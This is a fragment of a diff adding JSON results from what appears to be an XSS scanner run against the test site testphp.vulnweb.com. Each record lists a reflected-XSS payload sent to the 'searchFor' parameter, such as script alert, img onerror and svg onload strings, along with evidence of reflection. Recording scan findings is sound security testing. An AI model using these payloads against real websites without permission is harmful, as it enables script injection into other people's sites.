+      "payload": "<script>alert('x')</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "\"><script>alert(1)</script>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<img src=x onerror=alert(1)>",
+      "evidence": "payload reflected in response"
+    },
+    {
+      "type": "XSS-form",
+      "action": "http://testphp.vulnweb.com/search.php?test=query",
+      "param": "searchFor",
+      "payload": "<svg/onload=alert(1)>",
+      "evidence": "payload reflected in response"
+    }
+  ]
+}
